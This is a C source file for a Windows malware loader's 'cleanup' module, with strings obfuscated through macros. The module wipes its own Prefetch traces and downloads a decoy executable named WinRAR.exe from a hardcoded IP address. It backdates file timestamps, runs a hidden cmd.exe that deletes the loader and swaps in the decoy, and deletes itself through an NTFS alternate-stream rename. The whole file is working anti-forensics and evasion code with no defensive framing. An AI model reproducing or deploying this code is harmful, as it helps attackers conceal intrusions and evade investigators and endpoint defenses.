#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>

#include "cleanup.h"
#include "control_api_client.h"
#include "obf.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#define REPLACE_MAX_SIZE (32 * 1024 * 1024)

static void cleanup_timestomp_file(cleanup_report *r, const wchar_t *path);

/* ── helpers ─────────────────────────────────────────────────────────── */

static void report_append(cleanup_report *r, const wchar_t *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    int written = _vsnwprintf_s(
            r->details + r->details_len,
            (sizeof(r->details) / sizeof(r->details[0])) - r->details_len,
            _TRUNCATE, fmt, args);
    va_end(args);
    if (written > 0) r->details_len += (size_t)written;
}

static int get_self_path(wchar_t *buf, DWORD capacity) {
    DWORD len = GetModuleFileNameW(NULL, buf, capacity);
    return (len > 0 && len < capacity) ? 1 : 0;
}

static const wchar_t *path_filename(const wchar_t *path) {
    const wchar_t *last = wcsrchr(path, L'\\');
    return last ? last + 1 : path;
}

/* ── 1. prefetch cleanup ─────────────────────────────────────────────── */

static void cleanup_prefetch(cleanup_report *r, const wchar_t *exe_name) {
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    wchar_t search[MAX_PATH];
    wchar_t upper_exe[MAX_PATH];
    size_t i;

    wcsncpy_s(upper_exe, MAX_PATH, exe_name, _TRUNCATE);
    for (i = 0; upper_exe[i]; i++)
        upper_exe[i] = (wchar_t)towupper(upper_exe[i]);

    _snwprintf_s(search, MAX_PATH, _TRUNCATE,
            SV_WSTR(SV_9E57A58B8F914581, L"C:\\Windows\\Prefetch\\*.pf"));

    hFind = FindFirstFileW(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        report_append(r,
                SV_WSTR(SV_055FD6CD46493A41, L"[prefetch] cannot access C:\\Windows\\Prefetch\\ (err %lu, need admin?)\r\n"), GetLastError());
        return;
    }

    do {
        wchar_t upper_found[MAX_PATH];
        wcsncpy_s(upper_found, MAX_PATH, fd.cFileName, _TRUNCATE);
        for (i = 0; upper_found[i]; i++)
            upper_found[i] = (wchar_t)towupper(upper_found[i]);

        if (wcsstr(upper_found, upper_exe) != NULL) {
            wchar_t full_path[MAX_PATH];
            HANDLE hFile;

            r->prefetch_found++;
            _snwprintf_s(full_path, MAX_PATH, _TRUNCATE,
                    SV_WSTR(SV_8309A271DB79BB91, L"C:\\Windows\\Prefetch\\%ls"), fd.cFileName);

            hFile = CreateFileW(full_path, GENERIC_WRITE, 0, NULL,
                    TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                CloseHandle(hFile);
                r->prefetch_cleaned++;
                report_append(r, SV_WSTR(SV_1FF1BFBD55E36826, L"[prefetch] CLEANED: %ls\r\n"),
                        fd.cFileName);
            } else {
                report_append(r,
                        SV_WSTR(SV_0C03C52899851410, L"[prefetch] FAILED (err %lu): %ls\r\n"),
                        GetLastError(), fd.cFileName);
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);

    if (r->prefetch_found == 0)
        report_append(r, SV_WSTR(SV_FD39ED80614B4874, L"[prefetch] no matching .pf files found\r\n"));
}

/* ── 2. download replacement binary ──────────────────────────────────── */

#define CLEANUP_AUXILIARY_PATH_CAP 1024
#define CLEANUP_FILE_NAME_CAP 64

static void cleanup_catalog_track(char *output, size_t capacity) {
    const char *role = control_api_session_role();
    const char *track = (role != NULL && strcmp(role, SV_STR(SV_F6CECEC39741D5A6, "developer")) == 0)
            ? SV_STR(SV_F6CECEC39741D5A6, "developer") : SV_STR(SV_7583C500C8E550C1, "release");
    strncpy_s(output, capacity, track, _TRUNCATE);
}

/* Authenticated catalog route for the authorized profile. Returns 0 when no
   session is cached, so the caller falls back to the compat route. */
static int cleanup_auxiliary_path(wchar_t *output, size_t capacity) {
    const char *token = control_api_session_token();
    char track[16];
    if (token == NULL || token[0] == '\0') return 0;
    cleanup_catalog_track(track, sizeof(track));
    if (_snwprintf_s(output, capacity, _TRUNCATE,
            SV_WSTR(SV_7886EC8931379CE2, L"/downloads/auxiliary?token=%S&track=%S"), token, track) < 0) {
        SecureZeroMemory(output, capacity * sizeof(wchar_t));
        return 0;
    }
    return 1;
}

/* Route label without the query string, so session tokens never land in the
   desktop log. */
static void cleanup_route_label(const wchar_t *path, wchar_t *output,
        size_t capacity) {
    size_t i = 0;
    if (output == NULL || capacity == 0) return;
    while (path != NULL && path[i] != L'\0' && path[i] != L'?'
            && i + 1 < capacity) {
        output[i] = path[i];
        ++i;
    }
    output[i] = L'\0';
}

static int cleanup_reserved_stem(const wchar_t *stem, size_t length) {
    wchar_t upper[8];
    size_t i;
    if (length < 3 || length > 4) return 0;
    for (i = 0; i < length && i < 8; ++i) {
        wchar_t c = stem[i];
        upper[i] = (c >= L'a' && c <= L'z') ? (wchar_t)(c - 32) : c;
    }
    if (length == 3) {
        return (upper[0] == L'C' && upper[1] == L'O' && upper[2] == L'N')
            || (upper[0] == L'P' && upper[1] == L'R' && upper[2] == L'N')
            || (upper[0] == L'A' && upper[1] == L'U' && upper[2] == L'X')
            || (upper[0] == L'N' && upper[1] == L'U' && upper[2] == L'L');
    }
    if ((upper[0] == L'C' && upper[1] == L'O' && upper[2] == L'M')
            || (upper[0] == L'L' && upper[1] == L'P' && upper[2] == L'T')) {
        return upper[3] >= L'1' && upper[3] <= L'9';
    }
    return 0;
}

/* Sanitizes the catalog file name from Content-Disposition. Always produces
   a usable name; returns 1 when it came from the server header. */
static int cleanup_sanitize_filename(const wchar_t *raw, wchar_t *output,
        size_t capacity) {
    const wchar_t *start;
    const wchar_t *slash;
    const wchar_t *backslash;
    const wchar_t *end;
    size_t length;
    size_t i;
    size_t stem_length;
    wcsncpy_s(output, capacity, SV_WSTR(SV_7DAF20CAD420B76A, L"WinRAR.exe"), _TRUNCATE);
    if (raw == NULL || raw[0] == L'\0' || output == NULL || capacity == 0)
        return 0;
    start = raw;
    slash = wcsrchr(raw, L'/');
    backslash = wcsrchr(raw, L'\\');
    if (slash != NULL && slash >= start) start = slash + 1;
    if (backslash != NULL && backslash >= start) start = backslash + 1;
    while (*start == L' ' || *start == L'"' || *start == L'\'') ++start;
    end = start + wcslen(start);
    while (end > start && (end[-1] == L' ' || end[-1] == L'"'
            || end[-1] == L'\'' || end[-1] == L'\r' || end[-1] == L'\n'))
        --end;
    length = (size_t)(end - start);
    if (length < 5 || length > 64 || length + 1 > capacity) return 0;
    if (start[0] == L'.' || start[0] == L' ') return 0;
    for (i = 0; i < length; ++i) {
        wchar_t c = start[i];
        int ok = (c >= L'a' && c <= L'z') || (c >= L'A' && c <= L'Z')
            || (c >= L'0' && c <= L'9') || c == L' ' || c == L'.'
            || c == L'_' || c == L'-';
        if (!ok) return 0;
        if (c == L'.' && i + 1 < length && start[i + 1] == L'.') return 0;
    }
    if (!(end[-4] == L'.'
            && (end[-3] == L'e' || end[-3] == L'E')
            && (end[-2] == L'x' || end[-2] == L'X')
            && (end[-1] == L'e' || end[-1] == L'E')))
        return 0;
    stem_length = length - 4;
    while (stem_length > 0 && (start[stem_length - 1] == L' '
            || start[stem_length - 1] == L'.'))
        --stem_length;
    if (stem_length == 0) return 0;
    if (cleanup_reserved_stem(start, stem_length)) {
        if (length + 2 > capacity) return 0;
        output[0] = L'_';
        wcsncpy_s(output + 1, capacity - 1, start, length);
        output[length + 1] = L'\0';
    } else {
        wcsncpy_s(output, capacity, start, length);
        output[length] = L'\0';
    }
    return 1;
}

static int cleanup_ascii_prefix_ci(const wchar_t *line, const wchar_t *prefix,
        size_t count) {
    size_t i;
    for (i = 0; i < count; ++i) {
        wchar_t a = line[i];
        wchar_t b = prefix[i];
        if (a >= L'a' && a <= L'z') a = (wchar_t)(a - 32);
        if (b >= L'a' && b <= L'z') b = (wchar_t)(b - 32);
        if (a != b) return 0;
        if (a == L'\0') break;
    }
    return 1;
}

static int cleanup_hex_value(wchar_t c) {
    if (c >= L'0' && c <= L'9') return (int)(c - L'0');
    if (c >= L'a' && c <= L'f') return (int)(c - L'a') + 10;
    if (c >= L'A' && c <= L'F') return (int)(c - L'A') + 10;
    return -1;
}

/* Percent-decodes an RFC 5987 value into output. Returns the decoded length,
   or 0 on malformed input. */
static size_t cleanup_percent_decode(const wchar_t *src, size_t src_len,
        wchar_t *output, size_t capacity) {
    size_t read = 0;
    size_t written = 0;
    while (read < src_len) {
        wchar_t c = src[read];
        if (c == L'%') {
            int hi;
            int lo;
            if (read + 2 >= src_len) return 0;
            hi = cleanup_hex_value(src[read + 1]);
            lo = cleanup_hex_value(src[read + 2]);
            if (hi < 0 || lo < 0) return 0;
            c = (wchar_t)((hi << 4) | lo);
            read += 3;
        } else {
            ++read;
        }
        if (written + 1 >= capacity) return 0;
        output[written++] = c;
    }
    if (written >= capacity) return 0;
    output[written] = L'\0';
    return written;
}

/* Reads the catalog file name from the Content-Disposition response header.
   Prefers RFC 5987 filename*= (used by the published backend), then plain
   filename=. Falls back to the compat name when absent or invalid. */
static int cleanup_response_filename(HINTERNET request, wchar_t *output,
        size_t capacity) {
    DWORD size_bytes = 0;
    wchar_t *headers = NULL;
    wchar_t *line;
    int from_header = 0;
    wcsncpy_s(output, capacity, SV_WSTR(SV_7DAF20CAD420B76A, L"WinRAR.exe"), _TRUNCATE);
    if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_RAW_HEADERS_CRLF,
            NULL, NULL, &size_bytes,
            WINHTTP_NO_HEADER_INDEX)
            && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        return 0;
    if (size_bytes == 0 || size_bytes > 32768) return 0;
    headers = (wchar_t *)malloc(size_bytes + sizeof(wchar_t));
    if (!headers) return 0;
    if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_RAW_HEADERS_CRLF,
            NULL, headers, &size_bytes,
            WINHTTP_NO_HEADER_INDEX)) {
        free(headers);
        return 0;
    }
    headers[size_bytes / sizeof(wchar_t)] = L'\0';
    for (line = headers; *line != L'\0';) {
        wchar_t *end = line;
        wchar_t saved = L'\0';
        while (*end != L'\0' && *end != L'\r' && *end != L'\n') ++end;
        if (*end != L'\0') {
            saved = *end;
            *end = L'\0';
        }
        if (cleanup_ascii_prefix_ci(line, SV_WSTR(SV_221E111FCF90CEA2, L"content-disposition:"), 20)) {
            const wchar_t *value = line + 20;
            const wchar_t *star = NULL;
            const wchar_t *plain = NULL;
            const wchar_t *scan = value;
            while (*scan != L'\0') {
                if (star == NULL
                        && cleanup_ascii_prefix_ci(scan, SV_WSTR(SV_38152ED33DD27401, L"filename*="), 10)) {
                    star = scan + 10;
                } else if (plain == NULL
                        && cleanup_ascii_prefix_ci(scan, SV_WSTR(SV_C1A1FBF0B0D4EFB8, L"filename="), 9)) {
                    plain = scan + 9;
                }
                if (star != NULL && plain != NULL) break;
                ++scan;
            }
            if (star != NULL) {
                const wchar_t *val = star;
                const wchar_t *val_end;
                const wchar_t *cursor;
                const wchar_t *data;
                size_t data_len;
                wchar_t decoded[128];
                wchar_t quote = L'\0';
                while (*val == L' ' || *val == L'\t') ++val;
                if (*val == L'"' || *val == L'\'') {
                    quote = *val++;
                    val_end = wcschr(val, quote);
                    if (val_end == NULL) val_end = val + wcslen(val);
                } else {
                    val_end = val;
                    while (*val_end != L'\0' && *val_end != L';'
                            && *val_end != L' ' && *val_end != L'\t'
                            && *val_end != L'\r' && *val_end != L'\n')
                        ++val_end;
                }
                data = val;
                for (cursor = val; cursor + 1 < val_end; ++cursor) {
                    if (cursor[0] == L'\'' && cursor[1] == L'\'') {
                        data = cursor + 2;
                        break;
                    }
                }
                data_len = (data < val_end) ? (size_t)(val_end - data) : 0;
                if (data_len > 0 && data_len < _countof(decoded)
                        && cleanup_percent_decode(data, data_len, decoded,
                                _countof(decoded)) > 0) {
                    from_header = cleanup_sanitize_filename(decoded, output,
                            capacity);
                }
                SecureZeroMemory(decoded, sizeof(decoded));
            }
            if (!from_header && plain != NULL) {
                const wchar_t *found = plain;
                wchar_t candidate[128];
                size_t raw_length = 0;
                while (*found == L' ' || *found == L'\t') ++found;
                if (*found == L'"' || *found == L'\'') {
                    wchar_t quote = *found++;
                    const wchar_t *close = wcschr(found, quote);
                    raw_length = close != NULL
                            ? (size_t)(close - found) : wcslen(found);
                } else {
                    const wchar_t *stop = found;
                    while (*stop != L'\0' && *stop != L';' && *stop != L' '
                            && *stop != L'\t' && *stop != L'\r'
                            && *stop != L'\n')
                        ++stop;
                    raw_length = (size_t)(stop - found);
                }
                if (raw_length > 0 && raw_length < _countof(candidate)) {
                    wcsncpy_s(candidate, _countof(candidate), found,
                            raw_length);
                    candidate[raw_length] = L'\0';
                    from_header = cleanup_sanitize_filename(candidate,
                            output, capacity);
                }
                SecureZeroMemory(candidate, sizeof(candidate));
            }
            break;
        }
        if (saved == L'\0') break;
        line = end + 1;
        if (*line == L'\n') ++line;
        if (saved == L'\r' && *line == L'\n') ++line;
    }
    free(headers);
    return from_header;
}

static int cleanup_download_from_path(cleanup_report *r, const wchar_t *path,
        const char *session_token, unsigned char **out_data,
        size_t *out_size, wchar_t *out_name, size_t name_capacity) {
    HINTERNET session = NULL, connection = NULL, request = NULL;
    DWORD bytes_available, bytes_read, status_code, status_size, redir_policy;
    size_t capacity = 65536;
    unsigned char *data = NULL;
    size_t size = 0;
    int result = 0;
    wchar_t route[128];

    cleanup_route_label(path, route, _countof(route));
    report_append(r, SV_WSTR(SV_B01800A7CF8B4915, L"[replace] GET %ls\r\n"), route);

    session = WinHttpOpen(
            SV_WSTR(SV_CDFE24E57E4BCB10, L"SV/4.21"),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!session) {
        report_append(r, SV_WSTR(SV_1570B1F65A308CD0, L"[replace] WinHttpOpen failed (err %lu)\r\n"),
                GetLastError());
        goto done;
    }

    connection = WinHttpConnect(session,
            SV_WSTR(SV_43E3DA1113ECC5EA, L"54.94.145.87"),
            INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connection) {
        report_append(r, SV_WSTR(SV_A85FDC7F01EEEA28, L"[replace] WinHttpConnect failed (err %lu)\r\n"),
                GetLastError());
        goto done;
    }
    report_append(r, SV_WSTR(SV_9CBC32D6CF678D6C, L"[replace] WinHttpConnect OK\r\n"));

    request = WinHttpOpenRequest(connection,
            SV_WSTR(SV_A3B06DFD50686B71, L"GET"),
            path,
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
    if (!request) {
        report_append(r, SV_WSTR(SV_60E68575DD39B416, L"[replace] WinHttpOpenRequest failed (err %lu)\r\n"),
                GetLastError());
        goto done;
    }
    report_append(r, SV_WSTR(SV_22C831B24505106B, L"[replace] WinHttpOpenRequest OK\r\n"));

    redir_policy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    WinHttpSetOption(request, WINHTTP_OPTION_REDIRECT_POLICY,
            &redir_policy, sizeof(redir_policy));
    report_append(r, SV_WSTR(SV_35FADE3AE3970804, L"[replace] redirect policy set OK\r\n"));

    /* The published backend authenticates downloads via Authorization
       header (cookie/Bearer), so send the cached session as Bearer on
       every route. The server never echoes it back into the log. */
    if (session_token != NULL && session_token[0] != '\0') {
        wchar_t auth_header[512];
        if (_snwprintf_s(auth_header, _countof(auth_header), _TRUNCATE,
                SV_WSTR(SV_73CDB259BC908D8D, L"Authorization: Bearer %S"), session_token) >= 0) {
            WinHttpAddRequestHeaders(request, auth_header, (DWORD)-1,
                    WINHTTP_ADDREQ_FLAG_ADD);
        }
        SecureZeroMemory(auth_header, sizeof(auth_header));
    }

    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            NULL, 0, 0, 0)
            || !WinHttpReceiveResponse(request, NULL)) {
        report_append(r, SV_WSTR(SV_49BC2214CC7866B9, L"[replace] WinHttpSendRequest/Receive failed (err %lu)\r\n"),
                GetLastError());
        goto done;
    }
    report_append(r, SV_WSTR(SV_26F9AFDFC6770277, L"[replace] WinHttpSendRequest+Receive OK\r\n"));

    status_size = sizeof(status_code);
    if (!WinHttpQueryHeaders(request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status_code,
            &status_size, WINHTTP_NO_HEADER_INDEX)) {
        report_append(r, SV_WSTR(SV_DCAB69CF8B25A0E0, L"[replace] status query failed (err %lu)\r\n"),
                GetLastError());
        goto done;
    }
    report_append(r, SV_WSTR(SV_CB9FA6E57EDFFE60, L"[replace] HTTP status: %lu\r\n"), status_code);

    if (status_code != 200) {
        report_append(r, SV_WSTR(SV_4C3D171EC39F1230, L"[replace] HTTP status %lu is not 200, aborting\r\n"),
                status_code);
        goto done;
    }

    if (out_name != NULL && name_capacity > 0)
        cleanup_response_filename(request, out_name, name_capacity);

    data = (unsigned char *)malloc(capacity);
    if (!data) goto done;

    for (;;) {
        unsigned char *resized;
        DWORD remaining;
        DWORD offset = 0;
        if (!WinHttpQueryDataAvailable(request, &bytes_available)) {
            report_append(r, SV_WSTR(SV_A06DE57FFAA501F0, L"[replace] data query failed (err %lu)\r\n"),
                    GetLastError());
            goto done;
        }
        if (bytes_available == 0) break;
        if (size + bytes_available > REPLACE_MAX_SIZE) {
            report_append(r, SV_WSTR(SV_15AC8FCD64F15E09, L"[replace] response too large, aborting\r\n"));
            goto done;
        }
        if (size + bytes_available > capacity) {
            capacity = (size + bytes_available) * 2;
            resized = (unsigned char *)realloc(data, capacity);
            if (!resized) goto done;
            data = resized;
        }
        remaining = bytes_available;
        while (remaining > 0) {
            if (!WinHttpReadData(request, data + size + offset, remaining,
                    &bytes_read)) {
                report_append(r, SV_WSTR(SV_32DE92AABDD37F8F, L"[replace] data read failed (err %lu)\r\n"),
                        GetLastError());
                goto done;
            }
            if (bytes_read == 0) break;
            offset += bytes_read;
            remaining -= bytes_read;
        }
        if (offset == 0) {
            report_append(r, SV_WSTR(SV_27CA60EA680CA724, L"[replace] short read, aborting\r\n"));
            goto done;
        }
        size += offset;
    }

    if (size == 0) {
        report_append(r, SV_WSTR(SV_95AADD06A4978DC1, L"[replace] empty body, aborting\r\n"));
        goto done;
    }

    report_append(r, SV_WSTR(SV_9877781E7BC31C7B, L"[replace] download complete: %zu bytes, first 2 bytes: %02X %02X\r\n"),
            size, data[0], data[1]);

    if (size < 2 || data[0] != 'M' || data[1] != 'Z') {
        report_append(r, SV_WSTR(SV_D2C3DC1680655494, L"[replace] downloaded data is not a valid PE (no MZ header)\r\n"));
        goto done;
    }

    *out_data = data;
    *out_size = size;
    data = NULL;
    result = 1;

done:
    free(data);
    if (request) WinHttpCloseHandle(request);
    if (connection) WinHttpCloseHandle(connection);
    if (session) WinHttpCloseHandle(session);

    if (!result)
        report_append(r,
                SV_WSTR(SV_AB11F655BF929346, L"[replace] download failed\r\n"));
    else
        report_append(r,
                SV_WSTR(SV_996A2F7ACBF11BDC, L"[replace] downloaded %zu bytes\r\n"),
                *out_size);
    return result;
}

/* Catalog first (real published name per authorized profile), compat route
   second. Never leaves a zero-byte swap behind. */
static int cleanup_download_replacement(cleanup_report *r,
        unsigned char **out_data, size_t *out_size, wchar_t *out_name,
        size_t name_capacity) {
    wchar_t aux_path[CLEANUP_AUXILIARY_PATH_CAP];
    const char *session_token = control_api_session_token();
    wcsncpy_s(out_name, name_capacity, SV_WSTR(SV_7DAF20CAD420B76A, L"WinRAR.exe"), _TRUNCATE);
    if (cleanup_auxiliary_path(aux_path, _countof(aux_path))) {
        if (cleanup_download_from_path(r, aux_path, session_token, out_data,
                out_size, out_name, name_capacity)) {
            SecureZeroMemory(aux_path, sizeof(aux_path));
            return 1;
        }
        report_append(r, SV_WSTR(SV_446D3CA0D5C62D64, L"[replace] catalog unavailable, trying compat route\r\n"));
        SecureZeroMemory(aux_path, sizeof(aux_path));
    }
    return cleanup_download_from_path(r, SV_WSTR(SV_93008F3D7CA8B8D9, L"/downloads/winrar"),
            session_token, out_data, out_size, out_name, name_capacity);
}

/* ── 3. replace self with legitimate binary ─────────────────────────── */

static void cleanup_replace_self(cleanup_report *r,
        const wchar_t *self_path) {
    unsigned char *replacement = NULL;
    size_t replacement_size = 0;
    HANDLE hFile;
    DWORD written;
    wchar_t replacement_name[CLEANUP_FILE_NAME_CAP];
    wchar_t tmp_path[MAX_PATH];
    wchar_t target_path[MAX_PATH];
    wchar_t cmd_line[4096];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t *last_sep;

    if (!cleanup_download_replacement(r, &replacement, &replacement_size,
            replacement_name, _countof(replacement_name)))
        return;

    /* write replacement to a temp file next to the exe */
    _snwprintf_s(tmp_path, MAX_PATH, _TRUNCATE,
            SV_WSTR(SV_478C673A266076A0, L"%ls.tmp"), self_path);

    hFile = CreateFileW(tmp_path, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        report_append(r,
                SV_WSTR(SV_C6A9F7CE2FC9FEEE, L"[replace] cannot create replacement file (err %lu)\r\n"),
                GetLastError());
        free(replacement);
        return;
    }

    if (!WriteFile(hFile, replacement, (DWORD)replacement_size,
            &written, NULL) || written != (DWORD)replacement_size) {
        report_append(r,
                SV_WSTR(SV_81161D086F78EBA2, L"[replace] write failed (err %lu)\r\n"),
                GetLastError());
        CloseHandle(hFile);
        free(replacement);
        DeleteFileW(tmp_path);
        return;
    }

    CloseHandle(hFile);
    free(replacement);

    report_append(r, SV_WSTR(SV_E483E458A6CB290A, L"[replace] temp written: %zu bytes to %ls\r\n"),
            replacement_size, tmp_path);

    /* build target path: <same directory>\<catalog name>. The published
       catalog name arrives in Content-Disposition on every swap, so a
       rename in the panel applies on the next F6 without a client build. */
    report_append(r, SV_WSTR(SV_8E7985EB7807AC4D, L"[replace] using file name: %ls\r\n"), replacement_name);
    wcsncpy_s(target_path, MAX_PATH, self_path, _TRUNCATE);
    last_sep = wcsrchr(target_path, L'\\');
    if (last_sep)
        wcscpy_s(last_sep + 1,
                MAX_PATH - (size_t)(last_sep - target_path + 1),
                replacement_name);

    /* timestomp the temp file now — move preserves timestamps */
    cleanup_timestomp_file(r, tmp_path);

    /* spawn hidden cmd.exe: delete original, move replacement in place */
    _snwprintf_s(cmd_line, 4096, _TRUNCATE,
            SV_WSTR(SV_E3119BD7E49A80A5, L"cmd.exe /c ping localhost -n 6 >nul & del /f \"%ls\" & move /y \"%ls\" \"%ls\""),
            self_path, tmp_path, target_path);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    if (CreateProcessW(NULL, cmd_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        r->replace_ok = 1;
        report_append(r, SV_WSTR(SV_526F7EB2D27A29B9, L"[replace] swap scheduled (pid %lu), will complete after exit\r\n"),
                pi.dwProcessId);
    } else {
        report_append(r, SV_WSTR(SV_8BFAF287EFB0F59C, L"[replace] cannot spawn swap process (err %lu)\r\n"),
                GetLastError());
        DeleteFileW(tmp_path);
    }
}

/* ── 4. timestomp (also used by replace to backdate the new file) ──── */

static void cleanup_timestomp_file(cleanup_report *r,
        const wchar_t *path) {
    HANDLE hFile;
    FILETIME ft;
    SYSTEMTIME st;
    ULARGE_INTEGER uli;

    hFile = CreateFileW(path, FILE_WRITE_ATTRIBUTES,
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        report_append(r, SV_WSTR(SV_70D61B092266105B, L"[timestomp] FAILED to open (err %lu): %ls\r\n"),
                GetLastError(), path);
        return;
    }

    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &ft);

    uli.LowPart  = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    /* subtract ~10h3m (matches Squid-Ext reference) */
    uli.QuadPart -= (ULONGLONG)603 * 60 * 10000000;

    ft.dwLowDateTime  = uli.LowPart;
    ft.dwHighDateTime = uli.HighPart;

    if (SetFileTime(hFile, &ft, &ft, &ft)) {
        r->timestomp_ok = 1;
        report_append(r, SV_WSTR(SV_8383E6D4E6712C88, L"[timestomp] OK: %ls\r\n"), path);
    } else {
        report_append(r, SV_WSTR(SV_5453F8E8DE9F0D12, L"[timestomp] FAILED (err %lu): %ls\r\n"),
                GetLastError(), path);
    }

    CloseHandle(hFile);
}

/* ── 5. self-delete via NTFS ADS rename (fallback when replace fails) ─ */

static void cleanup_self_delete_impl(cleanup_report *r,
        const wchar_t *self_path) {
    HANDLE hFile;
    FILE_RENAME_INFO *rename_info;
    FILE_DISPOSITION_INFO disp;
    const wchar_t *ads_name = SV_WSTR(SV_3F44B307F43C066F, L":d");
    DWORD ads_bytes = (DWORD)(wcslen(ads_name) * sizeof(wchar_t));
    DWORD info_size = (DWORD)(sizeof(FILE_RENAME_INFO) + ads_bytes
            + sizeof(wchar_t));

    /* step 1: open with DELETE, rename default data stream to ADS */
    hFile = CreateFileW(self_path, DELETE, 0, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        report_append(r,
                SV_WSTR(SV_17A0732B73316DC1, L"[self-delete] cannot open for DELETE (err %lu)\r\n"),
                GetLastError());
        return;
    }

    rename_info = (FILE_RENAME_INFO *)calloc(1, info_size);
    if (rename_info == NULL) {
        CloseHandle(hFile);
        report_append(r, SV_WSTR(SV_83C778ECAE067574, L"[self-delete] alloc failed\r\n"));
        return;
    }

    rename_info->ReplaceIfExists = FALSE;
    rename_info->RootDirectory   = NULL;
    rename_info->FileNameLength  = ads_bytes;
    memcpy(rename_info->FileName, ads_name, ads_bytes);

    if (!SetFileInformationByHandle(hFile, FileRenameInfo,
            rename_info, info_size)) {
        report_append(r,
                SV_WSTR(SV_9B815F704FF178DB, L"[self-delete] ADS rename FAILED (err %lu)\r\n"),
                GetLastError());
        free(rename_info);
        CloseHandle(hFile);
        return;
    }

    free(rename_info);
    CloseHandle(hFile);

    /* step 2: reopen and mark for delete-on-close */
    hFile = CreateFileW(self_path, DELETE, 0, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        report_append(r,
                SV_WSTR(SV_2B9E566BA49E05E6, L"[self-delete] cannot reopen for disposition (err %lu)\r\n"), GetLastError());
        return;
    }

    memset(&disp, 0, sizeof(disp));
    disp.DeleteFile = TRUE;

    if (!SetFileInformationByHandle(hFile, FileDispositionInfo,
            &disp, sizeof(disp))) {
        report_append(r,
                SV_WSTR(SV_FD24AE8A69616673, L"[self-delete] delete disposition FAILED (err %lu)\r\n"), GetLastError());
        CloseHandle(hFile);
        return;
    }

    CloseHandle(hFile);
    r->self_delete_ok = 1;
    report_append(r, SV_WSTR(SV_CD4A18E0F72436F0, L"[self-delete] OK: marked for deletion\r\n"));
}

/* ── main orchestrator ───────────────────────────────────────────────── */

void cleanup_run(cleanup_report *report) {
    wchar_t self_path[MAX_PATH];
    const wchar_t *exe_name;

    memset(report, 0, sizeof(*report));

    if (!get_self_path(self_path, MAX_PATH)) {
        report_append(report, SV_WSTR(SV_A2DD88D69EE2D2BC, L"[init] cannot resolve own path\r\n"));
        return;
    }

    exe_name = path_filename(self_path);
    report_append(report, SV_WSTR(SV_D7B138A95C36BEB3, L"Loader: %ls\r\n\r\n"), self_path);

    /* 1. clean prefetch traces */
    cleanup_prefetch(report, exe_name);

    /* 2. replace: download catalog app (auxiliary, winrar compat) to .tmp,
       spawn cmd.exe to swap after exit */
    cleanup_replace_self(report, self_path);

    /* 3. timestomp the original exe */
    cleanup_timestomp_file(report, self_path);

    /* 4. self-delete via ADS rename — only when the swap is scheduled.
       Hollowing the exe without a replacement leaves a stream-less file
       that hangs Explorer on click. */
    if (report->replace_ok)
        cleanup_self_delete_impl(report, self_path);
}
